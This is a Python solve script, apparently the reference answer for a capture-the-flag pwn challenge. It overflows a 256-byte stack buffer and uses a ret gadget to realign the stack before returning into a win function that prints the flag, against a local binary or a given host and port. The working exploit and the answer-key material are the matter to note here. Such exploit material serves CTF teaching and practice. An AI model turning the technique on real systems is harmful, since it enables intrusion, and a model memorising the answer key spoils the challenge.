#!/usr/bin/env python3
"""
Reference exploit for "Double It And Give It To The Next Person".

Intended solution: ret2win with a stack-alignment fix.
  - 256-byte buffer, read() pulls in up to 0x200 bytes  -> stack overflow
  - 264 bytes of padding reach the saved return address
    (256 buffer + 8 saved RBP)
  - break_the_chain() calls system("/bin/cat flag.txt"). system() goes
    through do_system(), which executes `movaps` against the stack and
    FAULTS unless RSP is 16-byte aligned at the call.
  - A naive "padding + win" return lands misaligned and crashes before
    the flag prints. Prepend a bare `ret` gadget to nudge RSP by 8 and
    realign, THEN return into break_the_chain():
        padding + p64(ret_gadget) + p64(win)

Usage:
    ./solve.py                      # run against local ./double_it
    ./solve.py HOST PORT            # run against the live server

Works with pwntools if installed; otherwise falls back to the
standard library so graders don't need extra packages.
"""

import sys
import struct

OFFSET  = 264
WIN     = 0x4004c6   # address of break_the_chain() (non-PIE, so it's fixed)
RET     = 0x400356   # a bare `ret` gadget, used to 16-byte-align the stack
BIN     = "./double_it"

payload = b"A" * OFFSET + struct.pack("<Q", RET) + struct.pack("<Q", WIN) + b"\n"


def with_pwntools(argv):
    from pwn import context, process, remote
    context.log_level = "info"
    if len(argv) >= 2:
        io = remote(argv[0], int(argv[1]))
    else:
        io = process(BIN)
    io.send(payload)
    print(io.recvall(timeout=3).decode(errors="replace"))


def without_pwntools(argv):
    if len(argv) >= 2:
        import socket
        s = socket.create_connection((argv[0], int(argv[1])), timeout=5)
        s.sendall(payload)
        s.settimeout(3)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        print(data.decode(errors="replace"))
    else:
        import subprocess
        out = subprocess.run([BIN], input=payload,
                             capture_output=True, timeout=5)
        print(out.stdout.decode(errors="replace"))


if __name__ == "__main__":
    args = sys.argv[1:]
    try:
        with_pwntools(args)
    except ImportError:
        without_pwntools(args)
